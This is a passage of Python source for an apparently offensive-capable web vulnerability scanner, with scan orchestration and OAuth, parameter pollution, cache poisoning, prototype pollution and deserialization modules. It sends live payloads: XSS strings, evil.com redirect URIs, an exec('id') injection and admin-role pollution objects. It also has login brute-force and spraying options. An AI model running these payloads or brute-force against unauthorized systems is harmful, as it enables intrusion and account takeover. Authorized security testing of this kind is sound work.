    p.add_argument("--no-smuggling",  action="store_true", help="Skip HTTP request smuggling")
    p.add_argument("--no-idor",       action="store_true", help="Skip IDOR testing")
    p.add_argument("--no-advanced",   action="store_true", help="Skip Phase 2b+2c advanced modules (34–47)")
    # v11.0 flags
    p.add_argument("--scope",         default=None,
                   help="Only run these module keys, comma-separated (e.g. sqli,xss,jwt,dom_xss)")
    p.add_argument("--only",          default=None,
                   help=("Run ONLY these modules — comma-separated module keys (alias for --scope). "
                         "Available keys: waf, ip_info, ports, subdomains, headers, ssl, cookies, cors, "
                         "sqli, xss, lfi, ssti, cmdi, xxe, ssrf, csrf, jwt, redirect, idor, cors, "
                         "graphql, oauth2, deserialization, websocket, prototype_pollution, api_intel, "
                         "nosql_inject, sspp, oob_blind, file_upload, postmessage, acct_enum, login_brute, "
                         "osint_email, osint_dns, osint_dorks, osint_breach, osint_github, osint_js, "
                         "dom_xss, cache_poisoning, hpp, cve_mapping, cloud_bucket, s3_brute, wayback_urls. "
                         "Example: --only sqli,xss,nosql_inject"))
    p.add_argument("--rate",          type=float, default=0.0,
                   help="Seconds between requests — rate limit (default: 0 = unlimited)")
    return p.parse_args()

# ═══ MAIN ═════════════════════════════════════════════════════════
def main():
    global VERBOSE, QUIET, CHECKPOINT_FILE, SCAN_SCOPE, RATE_DELAY, TIMEOUT, THREADS

    args = parse_args()

    # Version
    if args.version:
        print(f"WebScan Pro v{VERSION}")
        sys.exit(0)

    # Comparison mode
    if args.compare:
        compare_reports(args.compare[0], args.compare[1])
        return

    if not args.url:
        print("Error: Target URL required. Use -h for help.")
        sys.exit(1)

    banner()

    # Verbosity
    if args.verbose:  VERBOSE = True
    if args.quiet:    QUIET   = True

    # Threads / Timeout — globals are already set to v11.2 defaults (50 / 7)
    if args.threads is not None:
        THREADS = args.threads
        info(f"Threads: {THREADS}")
    if args.timeout is not None:
        TIMEOUT = args.timeout
        info(f"Timeout: {TIMEOUT}s")

    # v11.0: Rate limit
    if args.rate and args.rate > 0:
        RATE_DELAY = args.rate
        info(f"Rate limit: {RATE_DELAY}s between requests")

    # v11.0: Scope filter  |  v11.8: --only alias
    _scope_val = args.only or args.scope
    if _scope_val:
        SCAN_SCOPE.update(s.strip() for s in _scope_val.split(",") if s.strip())
        info(f"Scope filter (--only): running ONLY: {SCAN_SCOPE}")

    # Proxy
    if args.proxy:
        _sess.proxies = {"http": args.proxy, "https": args.proxy}
        info(f"Proxy: {args.proxy}")

    # Cookies
    if args.cookie:
        for part in args.cookie.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                _sess.cookies.set(k.strip(), v.strip())
        info(f"Cookies set from --cookie flag")

    # CVSS filter
    cvss_min = args.cvss

    # Resume checkpoint
    if args.resume:
        CHECKPOINT_FILE = args.resume
        if os.path.exists(args.resume):
            _load_checkpoint(args.resume)
        else:
            CHECKPOINT_FILE = args.resume
            info(f"New checkpoint file: {CHECKPOINT_FILE}")
    else:
        # Auto checkpoint — save inside output directory
        ts_cp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(args.output, exist_ok=True)
        CHECKPOINT_FILE = os.path.join(args.output, f"checkpoint_{ts_cp}.json")

    url = args.url.rstrip("/")
    if not url.startswith(("http://","https://")):
        url = "http://" + url

    parsed = urlparse(url)
    domain = parsed.hostname

    # Auth prompt (skip with -y/--yes or -U/-P flags)
    auth_user = None; auth_pass = None
    try:
        if args.username and args.password:
            # Credentials provided via flags — no prompt
            auth_user = args.username
            auth_pass = args.password
            need_auth = "y"
        elif args.yes:
            need_auth = "n"
        else:
            need_auth = input(f"\n{Fore.CYAN}  Login required? (y/N): {Style.RESET_ALL}").strip().lower()
        if need_auth == "y" and not (auth_user and auth_pass):
            auth_user = input(f"  {Fore.CYAN}Username: {Style.RESET_ALL}").strip()
            auth_pass = input(f"  {Fore.CYAN}Password: {Style.RESET_ALL}").strip()
            login_url = url + "/login"
            r_login = rpost(login_url, data={"username": auth_user, "password": auth_pass})
            if r_login.status_code in (200, 302):
                good(f"Login attempt sent to {login_url}")
            else:
                warn(f"Login returned HTTP {r_login.status_code}")
    except (EOFError, KeyboardInterrupt):
        pass

    info(f"Target: {url}")
    info(f"Version: WebScan Pro v{VERSION}")
    info(f"Modules: 80  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
    info(f"Sensitive paths: {len(SENSITIVE_PATHS)}  |  SSRF targets: 18")
    info(f"Output: {args.output}")
    info(f"Checkpoint: {CHECKPOINT_FILE}")

    # Helper: run a module, absorb exceptions so one failure doesn't kill the pool
    def _run(fn, *a, **kw):
        try: fn(*a, **kw)
        except Exception as _e: err(f"{fn.__name__} error: {_e}")

    # ── PHASE 1: RECON ─────────────────────────────────────────────
    section("PHASE 1 — RECONNAISSANCE","🔍")
    # waf + ip_info first (fast, ~1-2s each; sequential is fine)
    detect_waf(url)
    _ip_data    = get_ip_info(domain)
    _target_ip  = (_ip_data.get("ip","") if isinstance(_ip_data, dict) else "")
    # ports + subs in parallel (independent, each can take 10-30s)
    open_ports = []; subs = []
    with ThreadPoolExecutor(max_workers=2) as _p1:
        _fp = _p1.submit(port_scan, domain)       if not args.no_ports else None
        _fs = _p1.submit(subdomain_enum, domain, wordlist=args.wordlist) if not args.no_subs else None
        if _fp:
            try: open_ports = _fp.result()
            except Exception as _e: err(f"port_scan error: {_e}")
        else:
            info("Port scan skipped (--no-ports)")
        if _fs:
            try: subs = _fs.result()
            except Exception as _e: err(f"subdomain_enum error: {_e}")
        else:
            info("Subdomain enum skipped (--no-subs)")

    # ── PHASE 1a: THREAT INTELLIGENCE API ─────────────────────────
    # Keys loaded from env vars — never hardcoded
    _vt_key      = os.environ.get("VT_API_KEY","").strip()
    _shodan_key  = os.environ.get("SHODAN_API_KEY","").strip()
    _abipdb_key  = os.environ.get("ABUSEIPDB_KEY","").strip()
    _urlscan_key = os.environ.get("URLSCAN_KEY","").strip()
    if any([_vt_key, _shodan_key, _abipdb_key, _urlscan_key]):
        section("PHASE 1a — THREAT INTELLIGENCE (API)","🛡️")
        api_intelligence_scan(url, domain, _target_ip,
                              vt_key=_vt_key      or None,
                              shodan_key=_shodan_key   or None,
                              abuseipdb_key=_abipdb_key   or None,
                              urlscan_key=_urlscan_key  or None)
    else:
        info("API Intelligence: No API keys set — set VT_API_KEY, SHODAN_API_KEY, ABUSEIPDB_KEY, URLSCAN_KEY in env")

    # ── PHASE 1b: OSINT — all 6 modules parallel ───────────────────
    section("PHASE 1b — OSINT INTELLIGENCE","🔎")
    _osint_tasks = [
        lambda: _run(osint_email_harvest, domain),
        lambda: _run(osint_dns_intel, domain),
        lambda: _run(osint_google_dorks, url, domain),
        lambda: _run(osint_breach_check, domain),
        lambda: _run(osint_github_exposure, domain),
        lambda: _run(osint_js_secrets, url),
    ]
    with ThreadPoolExecutor(max_workers=6) as _po:
        _fosint = [_po.submit(t) for t in _osint_tasks]
        for _f in as_completed(_fosint): _pass(_f)

    # ── PHASE 2: WEB / API — all modules parallel ──────────────────
    section("PHASE 2 — WEB APPLICATION ANALYSIS","🕵")
    _p2_tasks = [
        lambda: _run(detect_technology, url),
        lambda: _run(check_headers, url, out_dir=args.output),
        lambda: _run(check_methods, url),
        lambda: _run(check_ssl, url),
        lambda: _run(check_cookies, url),
        lambda: _run(check_cors, url),
        lambda: _run(check_sensitive, url),
        lambda: _run(dir_bruteforce, url, wordlist=args.wordlist),
        lambda: _run(sqli_scan, url),
        lambda: _run(xss_scan, url),
        lambda: _run(lfi_scan, url),
        lambda: _run(ssti_scan, url) if not args.no_ssti else info("SSTI skipped (--no-ssti)"),
        lambda: _run(cmdi_scan, url) if not args.no_cmdi else info("Command injection skipped (--no-cmdi)"),
        lambda: _run(xxe_scan, url),
        lambda: _run(open_redirect, url),
        lambda: _run(csrf_scan, url),
        lambda: _run(ssrf_scan, url),
        lambda: _run(jwt_scan, url),
        lambda: _run(authn_bypass, url),
        lambda: _run(rate_limit_check, url),
        lambda: _run(graphql_scan, url),
        lambda: _run(privesc_scan, url),
        lambda: _run(post_inject_scan, url),
        lambda: _run(stored_xss_scan, url),
        lambda: _run(host_header_injection, url),
        lambda: _run(crlf_scan, url),
        lambda: _run(idor_scan, url, skip_idor=args.no_idor),
        lambda: _run(subdomain_takeover, url, subdomains=subs),
        lambda: _run(dns_zone_transfer, domain),
        lambda: _run(request_smuggling, url, skip_smuggling=args.no_smuggling),
    ]
    with ThreadPoolExecutor(max_workers=8) as _p2:
        _futs2 = [_p2.submit(t) for t in _p2_tasks]
        for _f in as_completed(_futs2): _pass(_f)

    # ── PHASE 2b + 2c: ADVANCED — all modules parallel ─────────────
    if not args.no_advanced:
        section("PHASE 2b — ADVANCED SECURITY MODULES (34–47)","🚀")
        _p2b_tasks = [
            lambda: _run(oauth2_scan, url),
            lambda: _run(hpp_scan, url),
            lambda: _run(cache_poisoning_scan, url),
            lambda: _run(prototype_pollution_scan, url),
            lambda: _run(deserialization_scan, url),
            lambda: _run(api_security_scan, url),
            lambda: _run(business_logic_scan, url),
            lambda: _run(websocket_scan, url),
            lambda: _run(saml_scan, url),
            lambda: _run(otp_bypass_scan, url),
            lambda: _run(path_normalization_scan, url),
            lambda: _run(email_injection_scan, url),
            lambda: _run(dependency_confusion_scan, url),
            lambda: _run(dom_xss_scan, url),
        ]
        with ThreadPoolExecutor(max_workers=8) as _p2b:
            _futs2b = [_p2b.submit(t) for t in _p2b_tasks]
            for _f in as_completed(_futs2b): _pass(_f)

        # ── PHASE 2d: NIKTO/ZAP-STYLE (54–57) ─────────────────────
        section("PHASE 2d — NIKTO/ZAP-STYLE CHECKS (54–57)","🔍")
        _p2d_tasks = [
            lambda: _run(default_creds_scan, url),
            lambda: _run(server_hardening_scan, url),
            lambda: _run(info_disclosure_scan, url),
            lambda: _run(zap_passive_scan, url),
        ]
        with ThreadPoolExecutor(max_workers=4) as _p2d:
            _futs2d = [_p2d.submit(t) for t in _p2d_tasks]
            for _f in as_completed(_futs2d): _pass(_f)
    else:
        info("Skipping Phase 2b+2c+2d advanced modules (--no-advanced)")

    # ── PHASE 2e: v11.5 NEW MODULES (58–70) ────────────────────────
    section("PHASE 2e — v11.5 NEW MODULES (58–70)","🆕")
    _p2e_tasks = [
        lambda: _run(web_crawler_scan, url),
        lambda: _run(cloud_bucket_scan, url),
        lambda: _run(mass_assignment_scan, url),
        lambda: _run(account_takeover_scan, url),
        lambda: _run(redos_scan, url),
        lambda: _run(clickjacking_scan, url),
        lambda: _run(jsonp_scan, url),
        lambda: _run(css_injection_scan, url),
        lambda: _run(http2_scan, url),
        lambda: _run(cve_mapping_scan, url),
        lambda: _run(s3_brute_scan, url),
        lambda: _run(wayback_scan, url),
        lambda: _run(param_discovery_scan, url),
        lambda: _run(race_condition_scan, url),
        lambda: _run(waf_bypass_scan, url),
        lambda: _run(nosql_injection_scan, url),
        lambda: _run(sspp_scan, url),
        lambda: _run(oob_blind_scan, url),
        lambda: _run(file_upload_scan, url),
        lambda: _run(postmessage_scan, url),
        lambda: _run(account_enum_scan, url),
        lambda: _run(login_bruteforce_scan, url,
                     combo_file=args.combo,
                     spray_pass=args.spray,
                     custom_user=args.username,
                     wordlist=args.wordlist),
    ]
    with ThreadPoolExecutor(max_workers=8) as _p2e:
        _futs2e = [_p2e.submit(t) for t in _p2e_tasks]
        for _f in as_completed(_futs2e): _pass(_f)

    # ── PHASE 3: REPORTS ───────────────────────────────────────────
    section("PHASE 3 — REPORT GENERATION","📊")
    # Auto-create output directory
    os.makedirs(args.output, exist_ok=True)
    try:
        html_path, json_path, expert_path = build_report(url, out_dir=args.output, cvss_min=cvss_min)
    except Exception as _rpt_err:
        err(f"Report generation failed: {_rpt_err}")
        import traceback as _tb2; err(_tb2.format_exc()[-500:])
        html_path = os.path.join(args.output, "report_error.html")
        json_path = os.path.join(args.output, "report_error.json")
        expert_path = None
    # Burp Suite XML — only with --burp flag
    burp_path = None
    if args.burp:
        burp_path = export_burp_xml(url, out_dir=args.output)
    # PDF — auto-generate if weasyprint installed; --pdf forces it (shows error clearly)
    pdf_path = None
    try:
        import weasyprint as _wp
        pdf_path = html_path.replace(".html", ".pdf")
        _wp.HTML(filename=html_path).write_pdf(pdf_path)
        good(f"PDF saved: {pdf_path}")
    except ImportError:
        if args.pdf:
            warn("weasyprint not installed — run: pip3 install weasyprint")
        else:
            info("PDF skipped (pip3 install weasyprint to enable)")
    except Exception as e:
        warn(f"PDF generation failed: {e}")

    # ── SUMMARY ────────────────────────────────────────────────────
    counts = _sev_counts()
    total  = _total()
    score  = _risk_score()
    section("SCAN COMPLETE — SUMMARY","📋")
    print(f"\n  {Fore.WHITE}Target   : {Fore.CYAN}{url}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Duration : {Fore.CYAN}{elapsed()}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Findings : {Fore.CYAN}{total}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Critical : {counts.get('Critical',0)}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTRED_EX}High     : {counts.get('High',0)}{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}Medium   : {counts.get('Medium',0)}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTCYAN_EX}Low      : {counts.get('Low',0)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Info     : {counts.get('Info',0)}{Style.RESET_ALL}")
    print(f"\n  {Fore.WHITE}Risk Score: {Fore.RED if score>=70 else Fore.YELLOW if score>=40 else Fore.GREEN}{score}/100{Style.RESET_ALL}")
    print(f"\n  {Fore.GREEN}Reports saved → {Fore.CYAN}{args.output}{Style.RESET_ALL}")
    print(f"    {Fore.GREEN}HTML{Style.RESET_ALL} : {html_path}")
    print(f"    {Fore.GREEN}JSON{Style.RESET_ALL} : {json_path}")
    if burp_path:
        print(f"    {Fore.GREEN}Burp{Style.RESET_ALL} : {burp_path}")
    if pdf_path and os.path.exists(pdf_path):
        print(f"    {Fore.GREEN}PDF    {Style.RESET_ALL} : {pdf_path}")
    if expert_path and os.path.exists(str(expert_path)):
        print(f"    {Fore.GREEN}Expert {Style.RESET_ALL} : {expert_path}")
    print(f"\n  {Fore.CYAN}Open report:{Style.RESET_ALL}")
    print(f"    firefox \"{html_path}\"")
    print(f"\n  {Fore.YELLOW}For authorized security testing only.{Style.RESET_ALL}\n")

    # ── CI/CD: --fail-on-severity exit code ──────────────────────
    fail_sev = getattr(args, "fail_on_severity", None)
    if fail_sev:
        sev_rank = {"critical":4,"high":3,"medium":2,"low":1,"info":0}
        threshold = fail_sev.lower().strip()
        thr_rank  = sev_rank.get(threshold, -1)
        if thr_rank < 0:
            warn(f"--fail-on-severity: unknown level '{threshold}' (use critical/high/medium/low)")
        else:
            worst = 0
            for findings in FINDINGS.values():
                for f in findings:
                    sev = str(f.get("severity","info")).lower()
                    worst = max(worst, sev_rank.get(sev, 0))
            if worst >= thr_rank:
                vuln(f"CI/CD FAIL: findings at or above '{threshold}' severity found (exit 1)")
                # Cleanup checkpoint before exit
                if CHECKPOINT_FILE and os.path.exists(CHECKPOINT_FILE):
                    try: os.remove(CHECKPOINT_FILE)
                    except Exception: pass
                sys.exit(1)
            else:
                good(f"CI/CD PASS: no findings at or above '{threshold}' severity (exit 0)")

    # Cleanup checkpoint on success
    if CHECKPOINT_FILE and os.path.exists(CHECKPOINT_FILE):
        try: os.remove(CHECKPOINT_FILE); vlog("Checkpoint cleaned up")
        except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  MODULE 34 — OAuth 2.0 Misconfiguration
# ═══════════════════════════════════════════════════════════════
def oauth2_scan(url):
    if _module_skip("oauth2"): return
    section("MODULE 34 — OAuth 2.0 Misconfiguration","🔑")
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Common OAuth endpoints
    oauth_endpoints = [
        "/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
        "/connect/authorize", "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration", "/oauth/token",
        "/oauth2/token", "/auth/token", "/login/oauth/authorize",
    ]

    found_endpoints = []
    for ep in oauth_endpoints:
        try:
            r = rget(base + ep, allow_redirects=False)
            if r.status_code not in (404, 410):
                found_endpoints.append(ep)
                vlog(f"OAuth endpoint found: {ep} → HTTP {r.status_code}")
        except Exception:
            pass

    if not found_endpoints:
        info("No OAuth endpoints detected")
        _module_done("oauth2"); return

    good(f"OAuth endpoints found: {found_endpoints}")

    # Test 1: Missing state parameter (CSRF on OAuth)
    for ep in found_endpoints[:3]:
        test_url = base + ep + "?response_type=code&client_id=test&redirect_uri=" + quote(base + "/callback")
        try:
            r = rget(test_url, allow_redirects=False)
            # If no state required and redirect goes through → CSRF possible
            if r.status_code in (200, 302) and "state" not in r.text.lower() and "error" not in r.text.lower():
                _add("OAuth Missing State Parameter (CSRF Risk)", "High",
                     "oauth2", test_url, "A07:2021", "CWE-352",
                     "OAuth 2.0 flow has no state parameter check → CSRF attack possible on authorization.",
                     f"Endpoint: {ep} responded without requiring 'state' parameter",
                     7.4, "Authorization endpoint missing state validation")
        except Exception:
            pass

    # Test 2: Open redirect in redirect_uri
    evil_redirects = [
        "https://evil.com", "https://evil.com/callback",
        "//evil.com", "https://target.evil.com",
        base + ".evil.com", "javascript:alert(1)",
    ]
    for ep in found_endpoints[:2]:
        for evil in evil_redirects[:3]:
            test_url = (base + ep +
                f"?response_type=code&client_id=test&redirect_uri={quote(evil)}&state=abc")
            try:
                r = rget(test_url, allow_redirects=False)
                loc = r.headers.get("Location","")
                if "evil.com" in loc or ("evil" in loc and r.status_code in (301,302,303,307,308)):
                    _add("OAuth Open Redirect in redirect_uri", "Critical",
                         "oauth2", test_url, "A07:2021", "CWE-601",
                         "OAuth authorization redirects to attacker-controlled domain → token/code theft.",
                         f"redirect_uri={evil} → Location: {loc}",
                         9.1, f"Test redirect_uri: {evil}")
                    break
            except Exception:
                pass

    # Test 3: Implicit flow token in URL (fragment leak)
    for ep in found_endpoints[:2]:
        test_url = (base + ep +
            f"?response_type=token&client_id=test&redirect_uri={quote(base+'/callback')}&state=xyz")
        try:
            r = rget(test_url, allow_redirects=False)
            loc = r.headers.get("Location","")
            if "access_token=" in loc or "#" in loc:
                _add("OAuth Implicit Flow Token in URL", "High",
                     "oauth2", test_url, "A07:2021", "CWE-200",
                     "OAuth implicit flow exposes access_token in URL fragment → Referer leakage, history exposure.",
                     f"response_type=token → Location contains token fragment",
                     7.5, "Use authorization code flow with PKCE instead")
        except Exception:
            pass

    # Test 4: Authorization code reuse
    for ep in found_endpoints[:1]:
        for _ in range(2):
            test_url = (base + ep +
                f"?response_type=code&client_id=test&redirect_uri={quote(base+'/callback')}&state=test123")
            try:
                r1 = rget(test_url, allow_redirects=False)
                r2 = rget(test_url, allow_redirects=False)
                if (r1.status_code == r2.status_code and
                        r1.headers.get("Location","") == r2.headers.get("Location","") and
                        r1.status_code in (200,302)):
                    _add("OAuth Potential Code Reuse (Deterministic Response)", "Medium",
                         "oauth2", test_url, "A07:2021", "CWE-294",
                         "OAuth endpoint returns identical response for repeated requests → possible code reuse.",
                         "Same code/redirect returned for two identical requests",
                         5.3, "Ensure one-time-use authorization codes")
            except Exception:
                pass

    _module_done("oauth2")


# ═══════════════════════════════════════════════════════════════
#  MODULE 35 — HTTP Parameter Pollution (HPP)
# ═══════════════════════════════════════════════════════════════
def hpp_scan(url):
    if _module_skip("hpp"): return
    section("MODULE 35 — HTTP Parameter Pollution","🌊")

    # Common parameters to pollute
    test_params = ["id", "user", "uid", "page", "action", "redirect",
                   "url", "file", "path", "type", "name", "q", "search",
                   "order", "sort", "category", "product", "item"]

    # GET HPP: duplicate param with different values
    for param in test_params[:8]:
        # Send ?param=1&param=2 — backend/WAF may take different values
        dup_url = f"{url}?{param}=SAFE_VALUE&{param}=<script>alert(1)</script>"
        try:
            r = rget(dup_url)
            body = r.text[:3000]
            # Check if XSS payload reflected (WAF bypass via HPP)
            if "<script>alert(1)</script>" in body or "alert(1)" in body:
                _add("HTTP Parameter Pollution — XSS WAF Bypass", "High",
                     "hpp", dup_url, "A03:2021", "CWE-235",
                     "Duplicate parameters bypass WAF; malicious value reflected in response.",
                     f"?{param}=SAFE&{param}=<script>alert(1)</script> → XSS payload reflected",
                     7.2, f"Duplicate param '{param}' reflected")
            # Check if second value used (server takes last)
            elif "SAFE_VALUE" not in body and param in body:
                vlog(f"HPP potential: {param} duplicate may be processed differently")
        except Exception:
            pass

    # POST HPP: inject extra param in body
    post_targets = []
    try:
        r = rget(url)
        if BS4:
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form")[:3]:
                action = form.get("action","")
                form_url = urljoin(url, action) if action else url
                fields = {inp.get("name","field"): "test" for inp in form.find_all("input")
                          if inp.get("name") and inp.get("type","text") not in ("submit","button","hidden","file")}
                if fields:
                    post_targets.append((form_url, fields))
    except Exception:
        pass

    for form_url, fields in post_targets[:2]:
        for param in list(fields.keys())[:2]:
            # Send param twice in POST body
            payload_body = "&".join(f"{k}={v}" for k,v in fields.items())
            payload_body += f"&{param}=INJECTED_HPP"
            try:
                r = rpost(form_url, data=payload_body,
                          headers={"Content-Type":"application/x-www-form-urlencoded"})
                if "INJECTED_HPP" in r.text:
                    _add("HTTP Parameter Pollution — POST Duplicate Reflected", "Medium",
                         "hpp", form_url, "A03:2021", "CWE-235",
                         "POST body duplicate parameter injected value reflected in response.",
                         f"param=original&param=INJECTED_HPP → 'INJECTED_HPP' in response",
                         5.4, f"Form: {form_url}, param: {param}")
            except Exception:
                pass

    # HPP in path-based params: /app/item/1/item/2
    parsed = urlparse(url)
    path_parts = [p for p in parsed.path.split("/") if p]
    if path_parts:
        dup_path = url.rstrip("/") + "/" + path_parts[-1] + "_HPP_TEST"
        try:
            r = rget(dup_path)
            if "HPP_TEST" in r.text:
                _add("HTTP Parameter Pollution — Path Segment Reflected", "Medium",
                     "hpp", dup_path, "A03:2021", "CWE-235",
                     "Path segment pollution reflected in response body.",
                     f"Path: {dup_path} → reflected in response",
                     4.3, "Path-based HPP")
        except Exception:
            pass

    _module_done("hpp")


# ═══════════════════════════════════════════════════════════════
#  MODULE 36 — Web Cache Poisoning
# ═══════════════════════════════════════════════════════════════
def cache_poisoning_scan(url):
    if _module_skip("cache_poison"): return
    section("MODULE 36 — Web Cache Poisoning","☣️")

    # Unkeyed headers to test
    unkeyed_headers = [
        ("X-Forwarded-Host", "evil-cache-poison.com"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Original-URL", "/cache-poison-test"),
        ("X-Rewrite-URL", "/cache-poison-test"),
        ("X-Forwarded-Port", "9999"),
        ("X-Host", "evil-cache-poison.com"),
        ("X-Forwarded-Server", "evil-cache-poison.com"),
        ("X-HTTP-Host-Override", "evil-cache-poison.com"),
    ]

    for hdr_name, hdr_val in unkeyed_headers:
        try:
            r_normal = rget(url)
            r_poison = rget(url, headers={hdr_name: hdr_val})
            body_p = r_poison.text[:5000]

            # Check if injected value reflected in response (cache poisonable)
            if hdr_val in body_p:
                _add(f"Web Cache Poisoning via {hdr_name}", "High",
                     "cache_poison", url, "A05:2021", "CWE-444",
                     f"Header '{hdr_name}' value reflected in response → attackers can poison the cache "
                     f"to serve malicious content to all users of this cached resource.",
                     f"{hdr_name}: {hdr_val} → reflected: '{hdr_val}' in body",
                     8.1, f"Test header: {hdr_name}: {hdr_val}")

            # Check if cache headers present (cacheable response)
            cache_hdr = r_normal.headers.get("Cache-Control","")
            age_hdr   = r_normal.headers.get("Age","")
            cf_cache  = r_normal.headers.get("CF-Cache-Status","")
            x_cache   = r_normal.headers.get("X-Cache","")
            if any([age_hdr, "max-age" in cache_hdr, "HIT" in cf_cache, "HIT" in x_cache]):
                if hdr_val in body_p:
                    _add(f"Confirmed Cacheable Cache Poisoning via {hdr_name}", "Critical",
                         "cache_poison", url, "A05:2021", "CWE-444",
                         f"Response is cached (Age/Cache-Control/CF-Cache-Status present) AND {hdr_name} reflected → "
                         f"active cache poisoning attack is feasible.",
                         f"{hdr_name} reflected + cache headers: Cache-Control={cache_hdr}, Age={age_hdr}",
                         9.0, f"Cacheable + reflected: {hdr_name}")
        except Exception:
            pass

    # Web Cache Deception: append static extension to sensitive path
    sensitive_paths_wcd = ["/account", "/profile", "/dashboard", "/settings",
                           "/admin", "/user", "/my-account", "/orders"]
    static_exts = [".css", ".js", ".png", ".jpg", ".ico"]
    for sp in sensitive_paths_wcd[:4]:
        for ext in static_exts[:2]:
            test_url = url.rstrip("/") + sp + "/nonexistent" + ext
            try:
                r = rget(test_url)
                if r.status_code == 200 and len(r.text) > 200:
                    # Check for user-sensitive content keywords
                    body_low = r.text.lower()
                    wcd_sigs = ["email","username","account","profile","session",
                                "token","balance","order","address"]
                    hits = [s for s in wcd_sigs if s in body_low]
                    if hits:
                        _add("Web Cache Deception", "High",
                             "cache_poison", test_url, "A05:2021", "CWE-525",
                             "Appending a static file extension to a sensitive path returns authenticated "
                             "content — cache may serve this to unauthenticated users.",
                             f"GET {test_url} → 200 with keywords: {hits}",
                             7.5, f"WCD path: {sp}{ext}")
            except Exception:
                pass

    # Fat GET — body in GET request cached differently
    try:
        r_fat = rget(url, headers={"Content-Length": "5"}, data="x=1\r\n")
        if r_fat.status_code == 200 and "x=1" in r_fat.text:
            _add("Fat GET Cache Poisoning Vector", "Medium",
                 "cache_poison", url, "A05:2021", "CWE-444",
                 "GET request with body reflected in response → cache may store body-influenced content.",
                 "GET with body Content-Length:5 / x=1 → reflected in response",
                 5.3, "Fat GET body reflected")
    except Exception:
        pass

    _module_done("cache_poison")


# ═══════════════════════════════════════════════════════════════
#  MODULE 37 — Prototype Pollution
# ═══════════════════════════════════════════════════════════════
def prototype_pollution_scan(url):
    if _module_skip("proto_poll"): return
    section("MODULE 37 — Prototype Pollution","⚗️")

    # Payloads for prototype pollution
    pp_params = [
        "__proto__[polluted]=webscanpro_pp_test",
        "constructor[prototype][polluted]=webscanpro_pp_test",
        "__proto__.polluted=webscanpro_pp_test",
        "constructor.prototype.polluted=webscanpro_pp_test",
        "__proto__[status]=500",
        "__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('id');x",
    ]

    marker = "webscanpro_pp_test"

    # GET query string pollution
    for payload in pp_params[:4]:
        test_url = f"{url}?{payload}"
        try:
            r = rget(test_url)
            body = r.text[:5000]
            if marker in body:
                _add("Prototype Pollution — GET Reflected", "High",
                     "proto_poll", test_url, "A03:2021", "CWE-1321",
                     "__proto__ or constructor.prototype pollution via query string reflected in response. "
                     "May allow property injection, privilege escalation, or RCE in Node.js apps.",
                     f"?{payload} → '{marker}' reflected in response",
                     8.1, f"Payload: {payload}")
            # Detect server error indicating deep object merge
            if r.status_code == 500 and "__proto__[status]=500" in payload:
                _add("Prototype Pollution — Server Error Induced (status=500)", "High",
                     "proto_poll", test_url, "A03:2021", "CWE-1321",
                     "__proto__[status]=500 caused HTTP 500 → server uses polluted prototype property "
                     "in response construction (deep merge vulnerability confirmed).",
                     f"?__proto__[status]=500 → HTTP 500 response",
                     7.5, "Status property pollution induced 500")
        except Exception:
            pass

    # POST JSON body pollution
    json_payloads = [
        '{"__proto__":{"polluted":"' + marker + '"}}',
        '{"constructor":{"prototype":{"polluted":"' + marker + '"}}}',
        '{"__proto__":{"isAdmin":true}}',
        '{"__proto__":{"role":"admin"}}',
    ]
    for jp in json_payloads:
        try:
            r = rpost(url, data=jp, headers={"Content-Type":"application/json"})
            body = r.text[:5000]
            if marker in body:
                _add("Prototype Pollution — POST JSON Body Reflected", "High",
                     "proto_poll", url, "A03:2021", "CWE-1321",
                     "Prototype pollution payload in POST JSON body reflected → deep merge of untrusted "
                     "object possible in server-side JavaScript.",
                     f"POST body: {jp[:80]}... → '{marker}' in response",
                     8.1, "JSON prototype pollution reflected")
            # Check for privilege escalation response indicators
            resp_low = r.text.lower()
            if any(x in resp_low for x in ['"isadmin":true','role":"admin','"admin":true']):
                _add("Prototype Pollution — Privilege Escalation Response", "Critical",
                     "proto_poll", url, "A03:2021", "CWE-1321",
                     "Prototype pollution payload caused admin/privileged property in server response "
                     "→ privilege escalation via prototype chain injection.",
                     f"POST {jp[:60]}... → response contains admin/isAdmin=true",
                     9.8, "Priv esc via prototype pollution")
        except Exception:
            pass

    # URL fragment pollution (client-side, check for reflection)
    fragment_test = url + "#__proto__[src]=javascript:alert(1)"
    try:
        r = rget(fragment_test)
        if "javascript:alert(1)" in r.text:
            _add("Prototype Pollution — URL Fragment Reflected (Client-Side)", "Medium",
                 "proto_poll", fragment_test, "A03:2021", "CWE-1321",
                 "URL fragment prototype pollution payload reflected server-side (unusual). "
                 "Client-side prototype pollution may still apply.",
                 f"Fragment payload reflected in server response",
                 5.4, "Fragment-based PP")
    except Exception:
        pass

    _module_done("proto_poll")


# ═══════════════════════════════════════════════════════════════
#  MODULE 38 — Insecure Deserialization
# ═══════════════════════════════════════════════════════════════
def deserialization_scan(url):
    if _module_skip("deserial"): return
    section("MODULE 38 — Insecure Deserialization","💣")

    # Probe 1: Java serialization magic bytes in response
    java_magic = b"\xac\xed\x00\x05"       # Java serialized object header
    java_b64   = _b64.b64encode(java_magic).decode()

    try:
        r = rget(url)
        raw = r.content[:512]
        if raw[:4] == java_magic:
            _add("Java Serialized Object in Response", "Critical",
                 "deserial", url, "A08:2021", "CWE-502",
                 "Server returns Java serialized object (aced0005 magic bytes) in HTTP response. "
                 "If deserialized client-side or in middleware, remote code execution is possible.",
                 "Response starts with Java serialization magic bytes: AC ED 00 05",
                 9.8, "Java magic bytes: aced0005 detected in response")
    except Exception:
        pass

    # Probe 2: Send Java gadget payload header and check timing (blind)
